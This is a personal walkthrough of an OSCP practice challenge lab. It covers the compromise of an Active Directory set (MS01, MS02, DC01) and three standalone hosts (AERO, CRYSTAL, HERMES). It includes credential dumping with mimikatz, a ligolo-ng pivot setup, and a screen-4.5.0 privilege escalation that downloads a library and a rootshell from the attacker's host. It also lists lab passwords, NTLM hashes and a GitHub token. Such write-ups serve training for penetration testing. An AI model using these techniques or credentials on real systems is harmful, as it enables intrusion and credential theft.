# Preamble
This is the first of three dedicated OSCP Challenge Labs. It is composed of six OSCP+ machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, and another three standalone machines that do not have any dependencies or intranet connections. All of the standalone machines have a `local.txt` and a `proof.txt` flag, however the Active Directory set only has a `proof.txt` on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, please use the credentials below for initial access: 

Username: Eric.Wallows
Password: EricLikesRunning800

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly **do not** recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!

# Active Directory
## MS01
### Initial Entry
- Given user credentials Eric.Wallows:EricLikesRunning800, Evil-WinRM into the machine and drop a reverse shell executable
	![[Pasted image 20250216183655.png]]
### Enumeration
- eric.wallows has SeImpersonatePrivilege, use PrintSpoofer to escalate
	![[Pasted image 20250216183639.png]]
- Found other users under the C:\Users tree
	![[Pasted image 20250216183822.png]]
	- celia.almeda
	- mary.williams
	- support
	- web_svc
- Nothing of interest within those folders
### Privilege Escalation
- PrintSpoofer
	![[Pasted image 20250216183715.png]]
### Further Exploitation
- Looking at ipconfig, there is an internal network (duh) with the IP range of 10.10.138.0/24
	![[Pasted image 20250216184103.png]]
- Run mimikatz
	- sekurlsa::logonpasswords to get Mary Williams and Celia Almeda NTLM hash
		- Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e
			![[Pasted image 20250216185036.png]]
		- celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
			![[Pasted image 20250216185130.png]]
	- lsadump::sam
		- Administrator HASH NTLM
			![[Pasted image 20250216195254.png]]
		- Administrator:3c4495bbd678fac8c9d218be4f2bbc7b
		- Crackstation cracked the hash as: December31
- Import SharpHound.ps1 and run script to get AD mapping
	- Run at least twice to ensure results
- Transfer JSON files back to Kali for BloodHound neo4j graphing

### BloodHound
- So many users wtf
	![[Pasted image 20250216190116.png]]
- Two main targets:
	![[Pasted image 20250216190255.png]]
	- tom_admin
	- administrator
- 
### Pivoting
- Setup ligolo-ng
	```shell
	# Prep Ligolo's tunnel interface
	kali@kali:~$ sudo ip tuntap add user $(whoami) mode tun ligolo
	kali@kali:~$ sudo ip link set ligolo up

	# Start Ligolo Proxy Server on Kali
	kali@kali:~$ ./linux_amd64-proxy -selfcert -laddr 0.0.0.0:443

	# Transfer Ligolo Agent Client and run on victim
	C:\Users\eric.wallows\Desktop> .\win64-agent.exe -connect 192.168.45.156:443 -ignore-cert

	# Start session with victim and inspect ipconfig subnet
	ligolo-ng>> session
	ligolo-ng>> ifconfig

	# Add route to ligolo tunnel on Kali
	kali@kali:~$ sudo ip route add 10.10.138.0/24 dev ligolo

	# Start tunnel on Ligolo
	ligolo-ng>> start
	```
- Use crackmapexec winrm to see where we can go
	- Try with celia.almeda credentials since we dont see mary.williams in the BloodHound results (may not be part of the domain, just a local user)
	![[Pasted image 20250216191045.png]]
- Looks like we can use celia to enter MS02 :3
## MS02
### Intial Entry
- Use Evil-WinRM to enter the machine as celia.almeda then upload reverse shell (add listeners on ligolo-ng tunnel first)
	```shell
	# Listener for reverse shell
	ligolo-ng>> listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:5555 --tcp
	
	# Listener for HTTP server (on Kali port 80)
	ligolo-ng>> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
	```
### Enumeration
- Download winPEAS and run
	- sql server running on 5985
		![[Pasted image 20250216193737.png]]
- Found windows.old (?)
	- Might be an old backup of the original Windows filesystem
	- Extract SAM and SYSTEM from C:\windows.old\Windows\System32
### Cracking
- Use impacket-secretsdump
	![[Pasted image 20250216195742.png]]
## DC01
### Initial Access
- Use tom_admin credentials to access DC01
	- tom_admin:4979d69d4ca66955c075c41cf45f24dc
- tom_admin is already local admin (YIPEEE)
### Flag
- Find proof.txt on Administrator's Desktop
	![[Pasted image 20250216200133.png]]
# AERO - 192.168.178.143
## Initial Scan
```c
# Nmap 7.95 scan initiated Sun Feb 16 18:28:13 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -T4 -oN AERO.txt 192.168.178.143
Nmap scan report for 192.168.178.143
Host is up (0.0046s latency).
Not shown: 65525 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Test Page for the Nginx HTTP Server on Fedora
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp  open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
|_ssl-date: TLS randomness does not represent time
```
## Initial Enumeration
### FTP
- Does not allow anonymous:anonymous login
### HTTP
- 3 HTTP servers/pages on port 80, 81 and 443
- All default pages for Apache2 and Nginx
- GoBuster on all 3 ports:
	- 80
		![[Pasted image 20250216201557.png]]
		- Pico CMS
		- has /api/ to look into
	- 81
		- Nothing
	- 443
		- Mirror of port 80 just HTTPS
### Pico CMS
- Version number on the front of the page
	- Pico 3.0.0-alpha.2
- Found API
	![[Pasted image 20250216202447.png]]
	- mysql
	- postgres
	- aerospike (?)
		- Runs on port 3000, database
	- openssh
### Exploiting Aerospike
- Found an exploit on SearchSploit / Exploit-DB
	- Might have issues so use github
		- git clone https://github.com/b4ny4n/CVE-2020-13151
		![[Pasted image 20250216204220.png]]
## Initial Entry 
### Local.txt
- Find local.txt on aero's home folder
	![[Pasted image 20250216204638.png]]
## Enumeration
- Transfer and run linpeas.sh
	- ???
- Check for SUID files
	```shell
	$ find / -perm -u=s -type f 2>/dev/null
	```
	- screen-4.5.0
### Privilege Escalation- Screen 4.5.0
- Found local privilege escalation exploit on SearchSploit
	- https://www.exploit-db.com/exploits/41154
- Run all the given commands within, copy the files needed from https://github.com/jebidiah-anthony/htb_flujab
```shell
$ wget http://192.168.45.156/libhax.so
$ wget http://192.168.45.156/rootshell

$ chmod +x /tmp/rootshell
$ cd /etc/
$ umask 000
$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
$ screen-4.5.0 -ls
$ /tmp/rootshell
```
## Flag
- Flag found in root folder
	![[Pasted image 20250216212029.png]]
# CRYSTAL - 192.168.178.144
## Initial Scan
```c
# Nmap 7.95 scan initiated Sun Feb 16 18:28:36 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -T4 -oN CRYSTAL.txt 192.168.178.144
Nmap scan report for 192.168.178.144
Host is up (0.0050s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-git: 
|   192.168.178.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://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@github.com/PWK-Challenge-Lab/dev.git
|_http-title: Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: Nicepage 4.21.12, nicepage.com
```
## Enumeration
- Found a Git Repo!
```shell
# Download the exposed git
kali@kali:~$ wget --mirror -I .git http://192.168.178.144/.git/

# View git commit logs (hint: security update >:3)
kali@kali:~$ cd /192.168.178.144
kali@kali:~$ git status
kali@kali:~$ git log

# View previous commit
kali@kali:~$ git show 621a2e79b3a4a08bba12effe6331ff4513bad91a
```
- Found credentials for MySQL db!
	![[Pasted image 20250216220920.png]]
	- stuart@challenge.lab:BreakingBad92
	- db_name: staff
## Initial Access & Local Flag
- SSH into the machine with stuart:BreakingBad92
- Flag on stuart's home folder
	![[Pasted image 20250216221604.png]]
## Enumeration
- More users in /etc/passwd
	![[Pasted image 20250216221716.png]]
	- thato
	- chloe
	- carla
- Found backup folder in /opt?
	![[Pasted image 20250216223239.png]]
	- Transfer to Kali
		```shell
		kali@kali:~$ scp stuart@192.168.178.144:/opt/backup/sitebackup* ./
		```
- only sitebackup3 is readable
	- password-protected
- Crack sitebackup3.zip
	```shell
	kali@kali:~$ zip2john sitebackup3.zip > ziphash.txt
	kali@kali:~$ john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
	```
	![[Pasted image 20250216223836.png]]
	- password=codeblue
- Found credentials in configuration.php
	![[Pasted image 20250216223954.png]]
- Found secret?
	![[Pasted image 20250216224430.png]]
- Try to SU into chloe using the secret
	![[Pasted image 20250216224510.png]]
## Privilege Escalation & Proof Flag
- Just sudo su - smh
- proof.txt in root folder
	![[Pasted image 20250216224608.png]]

# HERMES - 192.168.178.145
## Initial Scan
```c
# Nmap 7.95 scan initiated Sun Feb 16 18:28:52 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -T4 -oN HERMES.txt 192.168.178.145
Nmap scan report for 192.168.178.145
Host is up (0.0049s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Samuel's Personal Site
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1978/tcp open  unisql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    system windows 6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-02-16T10:33:50+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2025-02-16T10:33:10+00:00
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2025-02-12T01:34:25
|_Not valid after:  2025-08-14T01:34:25
7680/tcp open  pando-pub?
```
## Enumeration
### FTP
- Anon login allowed but nothing to read from server
### HTTP
- Plain bootstrap template, no directories found via gobuster
### Arbitrary Port
- Port 1978: Wifi Mouse (?)
	-  Searched Google and found exploits for WiFi Mouse
	- Try searchsploit "wifi mouse"
- Use 50972.py to obtain reverse shell

## Initial Access & Local Flag
- Reverse shell as offsec
- Local flag on offsec's desktop
	![[Pasted image 20250216233746.png]]
## Enumeration
- Transfer and run winPEASx64.exe
- Find this string
	![[Pasted image 20250216235029.png]]
- zachary:Th3R@tC@tch3r

## Privilege Escalation & Proof Flag
- xfreerdp as zachary into the machine
- proof.txt in Administrator Desktop
	![[Pasted image 20250216235734.png]]
	